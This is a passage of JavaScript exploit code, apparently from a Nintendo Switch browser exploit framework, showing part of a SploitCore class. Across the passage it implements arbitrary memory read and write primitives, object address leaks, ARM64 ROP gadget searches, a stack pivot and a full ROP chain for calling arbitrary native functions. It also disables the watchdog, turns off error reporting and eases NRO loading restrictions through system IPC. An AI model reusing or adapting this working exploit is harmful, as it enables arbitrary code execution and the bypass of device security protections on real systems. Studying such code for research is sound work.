	this.gadgetCache = this.loadCache();

	this.fake_stack = this.malloc(0x100000);

	this.ipcBuf = new Uint32Array(0x2000 >> 2);
	this.emptyIpcBuf = new Uint32Array(0x2000 >> 2); // Keep this empty.
	this.ipcBufAddr = this.getArrayBufferAddr(this.ipcBuf);
	this.sploitMixinInit();
	this.ipcServices = {};

	this.gc();
	utils.log('Disabling watchdog timer...');
	this.disableWatchdog();

	var versbuf = new ArrayBuffer(0x100);
	this.ipcMsg(3).cDescriptor(versbuf).sendTo("set:sys").assertOk();
	this.version = utils.u8a2nullstr(new Uint8Array(versbuf, 0x68, 0x100-0x68));

	var sc = this;

	if (config.sdbcore) {
		utils.log('Pwning sdb module...');
		this.sdb = new SDBCore(this, this.version);
		if(!this.sdb.initialized) {
			utils.log('Failed to initialize sdb');
			this.sdb = null;
		}
	}

	sc.getServices(["set:sys", "set:fd"], function (setsys, setfd) {
		var getSetting = function (session, cls, nam) { // session is set:sys
			var out = new Uint32Array(1);
			var x1 = utils.str2ab(cls);
			var x2 = utils.str2ab(nam);
			return sc.ipcMsg(38).bDescriptor(out, 4, 0).xDescriptor(x1, 48, 0).xDescriptor(x2, 48, 1).sendTo(session).asResult().map((r) => out[0]);
		}

		var setSetting = function (session, cls, nam, value) { // session is set:fd
			var a = new Uint32Array(1);
			a[0] = value;
			var x1 = utils.str2ab(cls);
			var x2 = utils.str2ab(nam);
			return sc.ipcMsg(2).xDescriptor(x1, 48, 0).xDescriptor(x2, 48, 1).aDescriptor(a, 4, 0).sendTo(session).asResult();
		}
		var cls = 'eupld', name = 'upload_enabled';
		var orig = getSetting(setsys, cls, name).assertOk();
		if(orig == 1) {
			utils.log('Disabling error uploading.');
			setSetting(setfd, cls, name, 0).assertOk();
		}

		if (this.version == '3.0.0') {
			orig = getSetting(setsys, "ro", "ease_nro_restriction").assertOk();
			if(orig == 0) {
				utils.log("Easing nro restriction...");
				setSetting(setfd, "ro", "ease_nro_restriction", 1).assertOk();
			}
		}
	});
	  
	this.asyncCaller = new AsyncCaller(this);
	utils.log('~~success');
};

SploitCore.prototype.isBrowser = true;
SploitCore.prototype.name = "browser";

/**
	Returns address of function
	@returns {u64} Address of function 
 */
SploitCore.prototype.getFuncAddr = function () {
	this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
	var tlfuncaddr = this.getAddr(this.func);
	return this.read8(tlfuncaddr, 6);
};

/**
	Reads 4 bytes from address
	@param {u64} addr - Address to read value from
	@param {number} [offset=0] - Offset to add to addr before read
	@returns {number}
 */
SploitCore.prototype.read4 = function (addr, offset) {
	if (arguments.length === 1) { offset = 0; }

	utils.assertu64(addr);
  
	this.va[4] = addr[0];
	this.va[5] = addr[1];
	this.va[6] = 1 + offset;
	return this.vb[offset];
};

/**
	Writes 4 bytes to address
	@param {number} val - Value to write
	@param {u64} addr - Address to write value to
	@param {number} [offset=0] - Offset to add to addr before write
 */
SploitCore.prototype.write4 = function (val, addr, offset) {
	if (arguments.length === 2) { offset = 0; }

	this.va[4] = addr[0];
	this.va[5] = addr[1];
	this.va[6] = 1 + offset;

	this.vb[offset] = val;
};

/**
	Reads 8 bytes from address
	@param {u64} addr - Address to read value from
	@param {number} [offset=0] - Offset to add to addr before read
	@returns {number}
 */
SploitCore.prototype.read8 = function (addr, offset) {
	if (arguments.length === 1) { offset = 0; }
	return [this.read4(addr, offset), this.read4(addr, offset + 1)];
};

/**
	Writes 8 bytes to address
	@param {number} val - Value to write
	@param {u64} addr - Address to write value to
	@param {number} [offset=0] - Offset to add to addr before write
 */
SploitCore.prototype.write8 = function (val, addr, offset) {
	if (arguments.length === 2) { offset = 0; }
	val = utils.pad64(val);
	this.write4(val[0], addr, offset);
	this.write4(val[1], addr, offset + 1);
};

/**
	Calls callback with an ArrayBuffer pointing to the view of memory requested.<br>
	If you return a value from within the callback it will be returned by {@link SploitCore#memview}<br>
	<b>Warning:</b> If you keep that view or any object using it around; you will tank the GC and your Switch will crash.
	@param {u64} addr - Base address for view
	@param {number} size - Number of bytes to view
	@param {function} func - Function which is called with ArrayBuffer.
	@returns {any} Value returned by func
 */
SploitCore.prototype.memview = function (addr, size, func) {
	var ab = new ArrayBuffer(0);
	var taddr = this.read8(this.getAddr(ab), 4);

	var origPtr = this.read8(taddr, 6);
	var origSize = this.read4(taddr, 8);
	this.write8(addr, taddr, 6);
	this.write4(size, taddr, 8);

	var ret = func.apply(this, [ab]);

	this.write8(origPtr, taddr, 6);
	this.write4(origSize, taddr, 8);

	return ret;
};

/**
	Returns address of object
	@param {object} obj - Object to get address of
	@returns {u64} Address of object
 */
SploitCore.prototype.getAddr = function (obj) {
	this.leakee['b'] = {'a': obj};
	return this.read8(this.read8(this.leakaddr, 4), 4);
};

/**
	Calculate address relative to main address
	@param {u64} off - Offset
	@returns {u64} Relative address
 */
SploitCore.prototype.mref = function (off) {
	return utils.add2(this.mainaddr, off);
};

/**
	Returns base address of current module
	@private
	@returns {u64}
 */
SploitCore.prototype.getBase = function () {
	var funcaddr = this.getFuncAddr();

	utils.dlog('Searching for start of module.');

	var baseaddr = this.read8(funcaddr, 8);
	baseaddr[0] = (baseaddr[0] & 0xFFFFF000) >>> 0;
	while (this.read4(baseaddr, 4) !== 0x304F524E) { baseaddr = utils.add2(baseaddr, -4096); }

	utils.dlog('First module ... ' + utils.paddr(baseaddr));

	return baseaddr;
};

/**
	TODO DOCS
	@private
 */
SploitCore.prototype.walkList = function () {
	var addr = this.base;
	utils.dlog('Initial NRO at ' + utils.paddr(addr));

	while (true) {
		var modoff = this.read4(addr, 1);
		addr = utils.add2(addr, modoff);
		var modstr = this.read4(addr, 6);
		addr = utils.add2(addr, modstr);

		// Read next link ptr
		addr = this.read8(addr);
		if (utils.nullptr(addr)) {
			utils.log('Reached end');
			break;
		}

		var nro = this.read8(addr, 8);

		if (utils.nullptr(nro)) {
			utils.dlog('Hit RTLD at ' + utils.paddr(addr));
			addr = this.read8(addr, 4);
			break;
		}

		if (this.read4(nro, 4) !== 0x304f524e) {
			utils.log('Something is wrong.  No NRO header at base.');
			break;
		}

		addr = nro;
		utils.dlog('Found NRO at ' + utils.paddr(nro));
	}

	while (true) {
		nro = this.read8(addr, 8);
		if (utils.nullptr(nro)) {
			utils.dlog('Hm, hit the end of things.  Back in rtld?');
			return;
		}

		if (this.read4(nro, this.read4(nro, 1) >> 2) === 0x30444f4d) {
			utils.dlog('Got MOD at ' + utils.paddr(nro));
			if (this.read4(nro, 4) === 0x8DCDF8 && this.read4(nro, 5) === 0x959620) {
				utils.dlog('Found main module.');
				this.wifiApplet = true;
				return nro;
			} else if (this.read4(nro, 4) === 0x2a0103f3 && this.read4(nro, 5) === 0x94000002) {
				utils.dlog('Found main module.');
				this.wifiApplet = false;
				return utils.add2(nro, 0x6000);
			}
		} else {
			utils.dlog('No valid MOD header.  Back at RTLD.');
			break;
		}

		addr = this.read8(addr, 0);
		if (utils.nullptr(addr)) {
			utils.dlog('End of chain.');
			break;
		}
	}
};

/**
	Returns a cache of gadgets for speed boost
	@private
	@returns {object}
 */
SploitCore.prototype.loadCache = function () {
	var self = this;
	function checkGadget (base, size, gadget, offset) {
		if (offset + gadget.length >= size) { return false; }
		return self.memview(utils.add2(base, offset), gadget.length, function (ab) {
			var u8 = new Uint8Array(ab);
			for (var i = 0; i < gadget.length; ++i) {
				if (gadget[i] !== -1 && gadget[i] !== u8[i]) { return false; }
			}
			return true;
		});
	}
	var request = new XMLHttpRequest();
	request.open('GET', '/cache', false);
	request.send(null);
	if (request.status === 200) {
		var cache = JSON.parse(request.responseText);
		for (var key in cache) {
			var offset = cache[key];
			key = JSON.parse('[' + key + ']');
			if (!checkGadget(this.mainaddr, this.mainTextSize, key, offset) && !checkGadget(this.base, this.wkcTextSize, key, offset)) {
				utils.log('Gadget cache invalid');
				return {};
			}
		}
		return cache;
	} else { return {}; }
};


// XXX: Make this work on uint32s.  Way faster.

/**
	Finds a gadget that matches required pattern
	@param {Array.<number>} input - Hex pattern to match
	@param {boolean} inWkc - Search in wkc
	@returns {u64|null} Address of gadget, or null if not found. 
 */
SploitCore.prototype.gadget = function (input, inWkc) {
	if (arguments.length === 1) { inWkc = false; }

	var bytes;
	if (typeof (input) === 'string') {
		var arr = [];
		for (var i = 0; i < input.length; i += 2) {
			arr.push(parseInt(input.substring(i, i + 2), 16));
		}
		bytes = arr;
	} else {
		bytes = input;
	}

	var ta = inWkc ? this.base : this.mainaddr;

	if (bytes in this.gadgetCache) {
		// utils.dlog('Found bytes in gadget cache');
		return utils.add2(ta, this.gadgetCache[bytes]);
	}

	var ts = inWkc ? this.wkcTextSize : this.mainTextSize;

	var ss = ts - bytes.length;
	var pair = this.memview(ta, ts, function (ab) {
		var u8 = new Uint8Array(ab);
		for (var i = 0; i < ss; i += 4) {
			var miss = false;
			for (var j = 0; j < bytes.length; ++j) {
				if (bytes[j] !== -1 && u8[i + j] !== bytes[j]) {
					miss = true;
					break;
				}
			}
			if (!miss) {
				var addr = utils.add2(ta, i);
				utils.log('Found gadget at ' + utils.paddr(addr));
				return [addr, i];
			}
		}
		return null;
	});

	if (pair === null) {
		var f = '';
		for (i = 0; i < bytes.length; ++i) {
			f += ('0' + bytes[i].toString(16)).slice(-2) + ' ';
		}
		utils.log('Could not find gadget with bytes: ' + f);
		throw new Error('Bad gadget');
	}

	this.gadgetCache[bytes] = pair[1];
	utils.pushCache(this.gadgetCache);
	return pair[0];
};

/**
	Disables the browser watchdog
 */
SploitCore.prototype.disableWatchdog = function () {
	var common_byte = navigator.userAgent.indexOf('4.0.0.6.9') != -1 ? 0x73 : 0x53;
	var vm = this.call(this.gadget([0xFF, 0x03, 0x01, 0xD1, 0xF4, 0x4F, 0x02, 0xA9, 0xFD, 0x7B, 0x03, 0xA9, 0xFD, 0xC3, 0x00, 0x91, (common_byte), -1, -1, -1, 0x73, -1, -1, -1, 0x60, 0x22, 0x00, 0x91, 0x08, 0xFC, 0xDF, 0x08, 0x48, 0x01, 0x00, 0x37], true));
	utils.log("VM: " + utils.paddr(vm));

	var wd = this.read8(utils.add2(vm, 0x2768));
	utils.log("WD: " + utils.paddr(wd));

	var ret0 = this.gadget([0xe0, 0x03, 0x1f, 0xaa, 0xc0, 0x03, 0x5f, 0xd6]);

	var current = this.read8(wd, 8 >> 2);
	if (current[0] != 0xFFFFFFFF || current[1] != 0x7FFFFFFF) {
		this.call(this.gadget([0xF9, 0x0F, 0x1B, 0xF8, 0xF8, 0x5F, 0x01, 0xA9, 0xF6, 0x57, 0x02, 0xA9, 0xF4, 0x4F, 0x03, 0xA9, 0xFD, 0x7B, 0x04, 0xA9, 0xFD, 0x03, 0x01, 0x91, 0xF3, 0x03, 0x00, 0xAA, 0x79, 0x06, 0x40, 0xF9, 0x68, 0x92, 0x40, 0x39], true), [wd, vm, [0xFFFFFFFF, 0x7FFFFFFF], ret0, 0, 0]);
	}
};

/**
	Returns the address of SP
	@returns {u64} Address of SP
 */
SploitCore.prototype.getSP = function () {
	// First gadget
	var jaddr = this.gadget([0x74, 0x32, 0x40, 0xF9, 0x7F, 0x3E, 0x00, 0xF9, 0x14, 0x01, 0x00, 0xB4, 0x80, 0x0A, 0x40, 0xF9]);

	utils.dlog('New jump at ' + utils.paddr(jaddr));
	utils.dlog('Assigning function pointer');

	var carr = new Uint32Array(16);
	var cbuf = this.read8(this.getAddr(carr), 4);

	var struct1 = this.malloc(0x48);
	var struct2 = this.malloc(0x28);
	var struct3 = this.malloc(0x518);
	var struct4 = this.malloc(0x38);

	this.write8(struct1, cbuf, 0);
	this.write8(this.gadget([0x09, 0x09, 0x40, 0xf9, 0x00, 0x01, 0x40, 0xf9, 0x01, 0x29, 0x40, 0xb9, 0x02, 0x1d, 0x40, 0xf9, 0x20, 0x01, 0x3f, 0xd6]), cbuf, 0x8 >> 2);
	this.write8(this.gadget([0x08, 0x08, 0x40, 0xf9, 0x00, 0x01, 0x40, 0xf9, 0x05, 0x10, 0x40, 0xf9, 0xa0, 0x00, 0x1f, 0xd6]), cbuf, 0x10 >> 2);

	this.write8(this.gadget([0xE8, 0x03, 0x00, 0xAA, 0x02, 0x05, 0x40, 0xF9, 0x82, 0x00, 0x00, 0xB4, 0xE0, 0x03, 0x00, 0x32]), struct1, 0);
	this.write8(struct2, struct1, 0x10 >> 2);

	this.write8(struct3, struct2, 0);
	this.write8(this.gadget([0xf3, 0x03, 0x00, 0xaa, 0x08, 0x41, 0x00, 0x91, 0x68, 0x02, 0x00, 0xf9, 0x68, 0x0e, 0x40, 0xf9, 0x00, 0x01, 0x3f, 0xd6]), struct2, 0x20 >> 2);

	this.write8([0x00000000, 0xffff0000], struct3, 0x8 >> 2);
	this.write8(this.gadget([0x08, 0x88, 0x42, 0xf9, 0x02, 0x19, 0x40, 0xf9, 0x40, 0x00, 0x1f, 0xd6]), struct3, 0x18 >> 2);
	this.write8(this.gadget([0x09, 0x11, 0x40, 0xf9, 0xe8, 0x23, 0x00, 0x91, 0xe1, 0x03, 0x14, 0xaa, 0x20, 0x01, 0x3f, 0xd6]), struct3, 0x20 >> 2);
	this.write8(struct4, struct3, 0x510 >> 2);

	this.write8(this.gadget([0x78, 0x06, 0x40, 0xf9, 0xe1, 0x03, 0x1e, 0x32, 0x00, 0x01, 0x3f, 0xd6]), struct4, 0x18 >> 2);
	this.write8(this.gadget([0x60, 0x03, 0x3f, 0xd6]), struct4, 0x28 >> 2);
	this.write8(this.gadget([0x02, 0x0d, 0x40, 0xf9, 0x08, 0x15, 0x40, 0xf9, 0xe0, 0x03, 0x01, 0xaa, 0xe1, 0x03, 0x08, 0xaa, 0x40, 0x00, 0x1f, 0xd6]), struct4, 0x30 >> 2);

	var funcaddr = this.getFuncAddr();
	utils.dlog('Function object at ' + utils.paddr(funcaddr));

	var curptr = this.read8(funcaddr, 8);
	this.write8(jaddr, funcaddr, 8);
	// utils.log('Patched function address from ' + utils.paddr(curptr) + ' to ' + utils.paddr(this.read8(this.funcaddr, 8)));

	utils.dlog('Assigned.  Jumping to get SP.');
	this.func.apply(0x100, [0, 0, 0, 0, 0, 0, 0, 0, carr, 0, 0, 0, 0, 0, 0, 0, 0]);
	utils.dlog('Jumped back from getting SP.');

	this.write8(curptr, funcaddr, 8);
	utils.dlog('Restored original function pointer.');

	var sp = utils.add2(this.read8(struct3, 0), -0x18);
	utils.dlog('Got stack pointer: ' + utils.paddr(sp));

	this.free(struct1);
	this.free(struct2);
	this.free(struct3);
	this.free(struct4);

	utils.dlog('Freed buffers');

	return sp;
};

/**
	Allocates a region of memory to use
	@param {number} bytes - Size of region
	@returns {u64} Address of region
 */
SploitCore.prototype.malloc = function (bytes) {
	var obj = new ArrayBuffer(bytes);
	var addr = this.getArrayBufferAddr(obj);
	this.allocated[addr] = obj;
	return addr;
};

/**
	TODO DOCS
 */
SploitCore.prototype.free = function (addr) {
	delete this.allocated[addr];
};

/**
	TODO DOCS
 */
SploitCore.prototype.getArrayBufferAddr = function (ab) {
	var offset = 0;
	if (ArrayBuffer.isView(ab)) {
		offset = ab.byteOffset;
		ab = ab.buffer;
	}
	if (!(ab instanceof ArrayBuffer)) {
		throw new Error('expected ArrayBuffer or view');
	}
	return utils.add2(this.read8(this.read8(this.getAddr(ab), 4), 6), offset);
};

/**
	TODO DOCS
 */
SploitCore.prototype.call = function (funcptr, args, fargs, registers, dump_regs) {
	if (typeof (funcptr) === 'number') {
		funcptr = utils.add2(this.mainaddr, funcptr);
	}
	switch (arguments.length) {
	case 1: {
		args = [];
	}
	case 2: {
		fargs = [];
	}
	case 3: {
		registers = [];
	}
	case 4: {
		dump_regs = false;
	}
	}

	for (var i = 0; i < args.length; i++) {
		if (args[i] instanceof ArrayBuffer || ArrayBuffer.isView(args[i])) {
			args[i] = this.getArrayBufferAddr(args[i]);
		}
		if (typeof(args[i]) !== "number" && !Array.isArray(args[i])) {
			throw new Error("argument " + i + " is invalid: " + args[i]);
		}
	}

	var carr = new Uint32Array(16);
	var cbuf = this.read8(this.getAddr(carr), 4);

	utils.dlog('Starting holy rop');
	var jaddr = this.gadget([0x74, 0x32, 0x40, 0xF9, 0x7F, 0x3E, 0x00, 0xF9, 0x14, 0x01, 0x00, 0xB4, 0x80, 0x0A, 0x40, 0xF9]);
	utils.dlog('New jump at ' + utils.paddr(jaddr));

	utils.dlog('Setting up structs');

	// Begin Gadgets
	var mov_x0_into_x8_load_br_x2 = this.gadget([0xE8, 0x03, 0x00, 0xAA, 0x02, 0x05, 0x40, 0xF9, 0x82, 0x00, 0x00, 0xB4, 0xE0, 0x03, 0x00, 0x32]);
	var load_x0_w1_x2_x9_blr_x9 = this.gadget([0x09, 0x09, 0x40, 0xf9, 0x00, 0x01, 0x40, 0xf9, 0x01, 0x29, 0x40, 0xb9, 0x02, 0x1d, 0x40, 0xf9, 0x20, 0x01, 0x3f, 0xd6]);
	var load_x2_x30_mov_sp_into_x2_br_x30 = this.gadget([0x1d, 0x78, 0x45, 0xa9, 0x02, 0x34, 0x40, 0xf9, 0x5f, 0x00, 0x00, 0x91, 0x08, 0x24, 0x47, 0x6d, 0x0a, 0x2c, 0x48, 0x6d, 0x0c, 0x34, 0x49, 0x6d, 0x0e, 0x3c, 0x4a, 0x6d, 0xe0, 0x03, 0x01, 0xaa, 0x41, 0x00, 0x00, 0xb5, 0x20, 0x00, 0x80, 0xd2, 0xc0, 0x03, 0x1f, 0xd6]);
	var load_x2_x8_br_x2 = this.gadget([0x02, 0x0d, 0x40, 0xf9, 0x08, 0x15, 0x40, 0xf9, 0xe0, 0x03, 0x01, 0xaa, 0xe1, 0x03, 0x08, 0xaa, 0x40, 0x00, 0x1f, 0xd6]);
	var load_x30_from_sp_br_x2 = this.gadget([0xfd, 0x7b, 0x42, 0xa9, 0xff, 0xc3, 0x00, 0x91, 0x40, 0x00, 0x1f, 0xd6]);
	var returngadg = this.gadget([0x60, 0x03, 0x3f, 0xd6]);

	var savegadg = this.gadget([0x00, 0x04, 0x00, 0xa9, 0x02, 0x0c, 0x01, 0xa9, 0x04, 0x14, 0x02, 0xa9, 0x06, 0x1c, 0x03, 0xa9]);
	var loadgadg = this.gadget([0x02, 0x0c, 0x41, 0xa9, 0x04, 0x14, 0x42, 0xa9, 0x06, 0x1c, 0x43, 0xa9, 0x08, 0x24, 0x44, 0xa9]);
	var loadgadg_stage2 = this.gadget([0xe0, 0x07, 0xc1, 0xa8, 0xe2, 0x0f, 0xc1, 0xa8, 0xe4, 0x17, 0xc1, 0xa8, 0xe6, 0x1f, 0xc1, 0xa8]);

	var load_x19 = this.gadget([0xf3, 0x17, 0x40, 0xf9, 0xfd, 0x7b, 0x43, 0xa9, 0xff, 0x03, 0x01, 0x91, 0xc0, 0x03, 0x5f, 0xd6]);
	var str_x20 = this.gadget([0x74, 0x0a, 0x00, 0xf9, 0xfd, 0x7b, 0x41, 0xa9, 0xf4, 0x4f, 0xc2, 0xa8, 0xc0, 0x03, 0x5f, 0xd6]);
	var str_x8 = this.gadget([0xfd, 0x7b, 0x41, 0xa9, 0x68, 0x02, 0x00, 0xf9, 0xf3, 0x07, 0x42, 0xf8, 0xc0, 0x03, 0x5f, 0xd6]);
	var load_and_str_x8 = this.gadget([0x68, 0x02, 0x40, 0xf9, 0x88, 0x02, 0x00, 0xf9, 0xfd, 0x7b, 0x41, 0xa9, 0xf4, 0x4f, 0xc2, 0xa8]);
	var str_x1 = this.gadget([0x61, 0x0e, 0x00, 0xf9, 0xfd, 0x7b, 0x41, 0xa9, 0xf4, 0x4f, 0xc2, 0xa8, 0xc0, 0x03, 0x5f, 0xd6]);
	var mov_x2_into_x1 = this.gadget([0xe1, 0x03, 0x02, 0xaa, 0x00, 0x01, 0x3f, 0xd6, 0xfd, 0x7b, 0xc1, 0xa8, 0xe0, 0x03, 0x1f, 0x2a]);
	var str_x0 = this.gadget([0xfd, 0x7b, 0x41, 0xa9, 0x60, 0x02, 0x00, 0xf9, 0xf3, 0x07, 0x42, 0xf8, 0xc0, 0x03, 0x5f, 0xd6]);
	var str_x9 = this.gadget([0x69, 0x2e, 0x00, 0xf9, 0xfd, 0x7b, 0x41, 0xa9, 0xf3, 0x07, 0x42, 0xf8, 0xc0, 0x03, 0x5f, 0xd6]);
	var mov_x19_into_x0 = this.gadget([0xfd, 0x7b, 0x41, 0xa9, 0xe0, 0x03, 0x13, 0xaa, 0xf3, 0x07, 0x42, 0xf8, 0xc0, 0x03, 0x5f, 0xd6]);

	// End Gadgets

	var context_load_struct = this.malloc(0x200);
	var block_struct_0 = this.malloc(0x200);
	var block_struct_1 = this.malloc(0x200);
	var block_struct_2 = this.malloc(0x200);
	var block_struct_3 = this.malloc(0x200);
	var savearea = this.malloc(0x400);
	var loadarea = this.malloc(0x400);
	var dumparea = this.malloc(0x400);
	var allocated_stack = utils.add2(this.fake_stack, 0); // Make a copy.
	var base_sp = this.getSP();

	// Step 0: Load up some initial ROP to launch into full control

	this.write8(utils.add2(cbuf, 0x38), cbuf, 0); // cbuf[0] = cbuf + 0x8
	this.write8(load_x2_x8_br_x2, cbuf, 0x8 >> 2); // Third gadget
	this.write8(load_x0_w1_x2_x9_blr_x9, cbuf, 0x18 >> 2); // Fourth Gadget
	this.write8(block_struct_0, cbuf, 0x28 >> 2); // Setup X8 with struct
	this.write8(mov_x0_into_x8_load_br_x2, cbuf, 0x38 >> 2); // Second gadget

	// Step 1: Load X8 with a fixed address, control X0:X2

	this.write8(context_load_struct, block_struct_0, 0x00 >> 2);
	this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_0, 0x08 >> 2);
	this.write8(load_x2_x30_mov_sp_into_x2_br_x30, block_struct_0, 0x10 >> 2);
	this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_0, 0x18 >> 2);
	this.write8(block_struct_1, block_struct_0, 0x28 >> 2);

	// Step 2: Stack pivot to SP - 0x8000. -0x30 to use a LR-loading gadget.

	this.write8(load_x2_x8_br_x2, context_load_struct, 0x58 >> 2);
	this.write8(allocated_stack, context_load_struct, 0x68 >> 2);
	this.write8(returngadg, context_load_struct, 0x158 >> 2);
	this.write8(base_sp, context_load_struct, 0x168 >> 2);

	// Step 3: Perform a full context-save of all registers to savearea.

	this.write8(savearea, block_struct_1, 0x0 >> 2);
	this.write8(load_x30_from_sp_br_x2, block_struct_1, 0x10 >> 2);
	this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_1, 0x18 >> 2);
	this.write8(block_struct_2, block_struct_1, 0x28 >> 2);
	this.write8(savegadg, block_struct_1, 0x38 >> 2);

	this.write8(load_x2_x8_br_x2, allocated_stack, 0x28 >> 2);

	var sp = utils.add2(allocated_stack, 0x30);

	// Step 4: Perform a full context-load from a region we control.

	this.write8(loadarea, block_struct_2, 0x00 >> 2);
	this.write8(loadgadg, block_struct_2, 0x10 >> 2);

	// Step 5: Write desired register contents to the context load region.

	this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
	this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2

	// Write registers for native code.
	if (registers.length > 9) {
		for (i = 9; i < 30 && i < registers.length; i++) {
			this.write8(registers[i], loadarea, (8 * i) >> 2);
		}
	}

	if (registers.length > 0) {
		for (i = 0; i <= 8 && i < registers.length; i++) {
			this.write8(registers[i], sp, (0x8 * i) >> 2);
		}

		if (registers.length > 19) {
			this.write8(registers[19], sp, 0x48 >> 2);
		}

		if (registers.length > 29) {
			this.write8(registers[29], sp, 0x50 >> 2);
		}
	}

	if (args.length > 0) {
		for (i = 0; i < args.length && i < 8; i++) {
			this.write8(args[i], sp, (0x8 * i) >> 2);
		}
	}

	if (fargs.length > 0) {
		for (i = 0; i < fargs.length && i < 32; i++) {
			this.write8(fargs[i], loadarea, (0x110 + 8 * i) >> 2);
		}
	}

	this.write8(funcptr, loadarea, 0x80 >> 2); // Set the code to call to our function pointer.
	this.write8(load_x19, sp, 0x58 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop

	// Stack arguments would be bottomed-out at sp + 0xE0...
	// TODO: Stack arguments support. Would just need to figure out how much space they take up
	// and write ROP above them. Note: the user would have to call code that actually used
	// that many stack arguments, or shit'd crash.

	// ROP currently begins at sp + 0xE0

	// Step 6: [Arbitrary code executes here]

	// Step 7: Post-code execution cleanup. Dump all registers to another save area,
	//         return cleanly to javascript.

	this.write8(utils.add2(dumparea, 0x300 - 0x10), sp, (0x060 + 0x28) >> 2); // Load X19 = dumparea + 0x300 - 0x10
	this.write8(str_x20, sp, (0x060 + 0x38) >> 2);                      // Load LR with str_x20
	this.write8(utils.add2(dumparea, 0x308), sp, (0x0A0 + 0x8) >> 2);        // Load X19 = dumparea + 0x308
	this.write8(str_x8, sp, (0x0A0 + 0x18) >> 2);                      // Load LR with str_x8
	this.write8(utils.add2(dumparea, 0x310 - 0x18), sp, (0x0C0 + 0x0) >> 2); // Load X19 = dumparea + 0x310 - 0x18
	this.write8(str_x1, sp, (0x0C0 + 0x18) >> 2);                      // Load LR with str_x1
	this.write8(utils.add2(dumparea, 0x3F8), sp, (0x0E0 + 0x0) >> 2);        // Load X20 with scratch space
	this.write8(utils.add2(dumparea, 0x380), sp, (0x0E0 + 0x8) >> 2);        // Load X19 = dumparea + 0x380
	this.write8(str_x1, dumparea, 0x380 >> 2);                         // Write str_x1 to dumparea + 0x380
	this.write8(load_and_str_x8, sp, (0x0E0 + 0x18) >> 2);             // Load LR with Load, STR X8
	this.write8(utils.add2(dumparea, 0x318 - 0x18), sp, (0x100 + 0x8) >> 2); // Load X19 = dumparea + 0x318 - 0x18
	this.write8(mov_x2_into_x1, sp, (0x100 + 0x18) >> 2);              // Load LR with mov x1, x2
	this.write8(utils.add2(dumparea, 0x3F8), sp, (0x120 + 0x0) >> 2);        // Load X20 with scratch space
	this.write8(utils.add2(dumparea, 0x320), sp, (0x120 + 0x8) >> 2);        // Load X19 = dumparea + 0x320
	this.write8(str_x0, sp, (0x120 + 0x18) >> 2);                      // Load LR with str x0
	this.write8(utils.add2(dumparea, 0x388), sp, (0x140 + 0x0) >> 2);        // Load X19 = dumparea + 0x388
	this.write8(utils.add2(dumparea, 0x320), dumparea, 0x388 >> 2);          // Write dumparea + 0x320 to dumparea + 0x388
	this.write8(load_and_str_x8, sp, (0x140 + 0x18) >> 2);             // Load LR with load, STR X8
	this.write8(utils.add2(dumparea, 0x3F8), sp, (0x160 + 0x0) >> 2);        // Load X20 with scratch space
	this.write8(utils.add2(dumparea, 0x328 - 0x58), sp, (0x160 + 0x8) >> 2); // Load X19 = dumparea + 0x328 - 0x58
	this.write8(str_x9, sp, (0x160 + 0x18) >> 2);                      // Load LR with STR X9
	this.write8(utils.add2(dumparea, 0x390), sp, (0x180 + 0x0) >> 2);        // Load X19 with dumparea + 0x390
	this.write8(block_struct_3, dumparea, 0x390 >> 2);                 // Write block struct 3 to dumparea + 0x390
	this.write8(load_and_str_x8, sp, (0x180 + 0x18) >> 2);             // Load LR with load, STR X8
	this.write8(load_x0_w1_x2_x9_blr_x9, sp, (0x1A0 + 0x18) >> 2);     // Load LR with gadget 2

	// Block Struct 3
	this.write8(dumparea, block_struct_3, 0x00 >> 2);
	this.write8(load_x30_from_sp_br_x2, block_struct_3, 0x10 >> 2);
	this.write8(savegadg, block_struct_3, 0x38 >> 2);

	this.write8(utils.add2(str_x20, 0x4), sp, (0x1C0 + 0x28) >> 2);          // Load LR with LD X19, X20, X30
	this.write8(utils.add2(savearea, 0xF8), sp, (0x1F0 + 0x0) >> 2);         // Load X20 with savearea + 0xF8 (saved SP)
	this.write8(utils.add2(dumparea, 0x398), sp, (0x1F0 + 0x8) >> 2);     // Load X19 with dumparea + 0x398
	this.write8(base_sp, dumparea, 0x398 >> 2);                           // Write SP to dumparea + 0x38
	this.write8(load_and_str_x8, sp, (0x1F0 + 0x18) >> 2);                   // Load X30 with LD, STR X8
	this.write8(utils.add2(savearea, 0x100), sp, (0x210 + 0x0) >> 2);        // Load X20 with savearea + 0x100 (saved LR)
	this.write8(utils.add2(dumparea, 0x3A0), sp, (0x210 + 0x8) >> 2);     // Load X19 with dumparea + 0x3A0
	this.write8(returngadg, dumparea, 0x3A0 >> 2);                        // Write return gadget to dumparea + 0x3A0
	this.write8(load_and_str_x8, sp, (0x210 + 0x18) >> 2);                   // Load X30 with LD, STR X8
	this.write8(utils.add2(savearea, 0xC0), sp, (0x230 + 0x0) >> 2);         // Load X20 with savearea + 0xC0 (saved X24)
	this.write8(utils.add2(dumparea, 0x3A8), sp, (0x230 + 0x8) >> 2);     // Load X19 with dumparea + 0x3A8
	this.write8([0x00000000, 0xffff0000], dumparea, 0x3A8 >> 2);          // Write return gadget to dumparea + 0x3A8
	this.write8(load_and_str_x8, sp, (0x230 + 0x18) >> 2);                   // Load X30 with LD, STR X8
	this.write8(savearea, sp, (0x250 + 0x8) >> 2);                           // Load X19 with savearea
	this.write8(mov_x19_into_x0, sp, (0x250 + 0x18) >> 2);                   // Load X30 with mov x0, x19.
	this.write8(loadgadg, sp, (0x270 + 0x18) >> 2);                          // Load X30 with context load

	utils.dlog('Assigning function pointer');

	var funcaddr = this.getFuncAddr();
	utils.dlog('Function object at ' + utils.paddr(funcaddr));
	var curptr = this.read8(funcaddr, 8);
	this.write8(jaddr, funcaddr, 8);
	utils.dlog('Patched function address from ' + utils.paddr(curptr) + ' to ' + utils.paddr(this.read8(funcaddr, 8)));
	utils.dlog('Jumping.');
	this.func.apply(0x100, [0, 0, 0, 0, 0, 0, 0, 0, carr, 0, 0, 0, 0, 0, 0, 0, 0]);
	utils.dlog('Jumped back.');

	this.write8(curptr, funcaddr, 8);
	utils.dlog('Restored original function pointer.');

	var ret = this.read8(dumparea, 0x320 >> 2);

	if (dump_regs) {
